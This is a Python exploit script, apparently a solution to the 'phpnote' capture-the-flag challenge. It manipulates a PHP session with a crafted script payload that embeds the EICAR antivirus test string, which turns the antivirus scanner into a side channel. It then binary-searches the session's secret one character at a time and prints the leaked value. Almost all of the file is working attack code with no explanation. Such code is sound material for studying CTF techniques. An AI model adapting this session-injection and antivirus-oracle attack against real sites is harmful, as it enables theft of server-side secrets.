import requests

URL = "http://phpnote.chal.ctf.westerns.tokyo/"


def trigger(c, idx):
    import string
    sess = requests.Session()
    # init session
    sess.post(URL + '/?action=login', data={'realname': 'new_session'})
    # manipulate session
    p = '''<script>f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script><body>'''
    p = string.Template(p).substitute({'idx': idx, 'c': c})
    resp = sess.post(URL + '/?action=login', data={'realname': '"http://127.0.0.1/flag?a=' + p, 'nickname': '</body>'})
    return "<h1>Welcome" not in resp.text


def leak(idx):
    l, h = 0, 0x100
    while h - l > 1:
        m = (h + l) // 2
        if trigger(m, idx):
            l = m
        else:
            h = m
    return chr(l)

# "2532bd172578d19923e5348420e02320"
secret = ''
for i in range(14, 14+34):
    secret += leak(i)
    print(secret)
